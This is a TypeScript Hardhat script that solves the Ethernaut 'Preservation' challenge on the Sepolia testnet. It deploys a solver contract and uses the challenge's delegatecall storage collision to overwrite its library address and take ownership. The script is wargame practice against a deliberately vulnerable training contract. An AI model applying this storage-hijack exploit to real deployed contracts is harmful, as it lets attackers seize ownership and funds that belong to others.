import { web3 } from "hardhat";
import challengeArtifacts from "../artifacts/contracts/ethernaut/Preservation.sol/Preservation.json";
import solverArtifacts from "../artifacts/contracts/ethernaut/Preservation.sol/PreservationSolver.json";
import { sepolia } from 'viem/chains'
import fs from "fs";
import { string } from "hardhat/internal/core/params/argumentTypes";

const privateKey = fs.readFileSync(".secret").toString().trim();
const player = web3.eth.accounts.privateKeyToAccount(privateKey);

async function prepareEnvironment() {
    web3.eth.accounts.wallet.add(player);
    web3.setProvider(new web3.providers.HttpProvider("https://rpc.sepolia.org"));

    console.log("Player address: ", player.address);

    const playerBalance = await web3.eth.getBalance(player.address);
    console.log("Player balance: ", playerBalance);
}

async function sendRawTransation(
    to: string,
    data: string,
    value: string
) {
    const hash = await web3.eth.sendTransaction({
        from: player.address,
        to,
        data,
        value
    })
    return hash;
}


async function main() {
    await prepareEnvironment();
    const solverContractApi = new web3.eth.Contract(solverArtifacts.abi);
    const rawSolverContract = solverContractApi.deploy({
        data: solverArtifacts.bytecode,
    });
    const solverContract = await rawSolverContract.send({
        from: player.address
    });

    const challengeContractApi = new web3.eth.Contract(challengeArtifacts.abi, "0xC0928AF32A7d0eedd295FcE44308828E7cb830a0");
    
    console.log("Solver contract address: ", solverContract.options.address);

    await challengeContractApi.methods.setSecondTime(solverContract.options.address).send({ from: player.address });
    await challengeContractApi.methods.setFirstTime(player.address).send({ from: player.address });
    const owner = await challengeContractApi.methods.owner().call();
    console.log("Owner: ", owner);
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
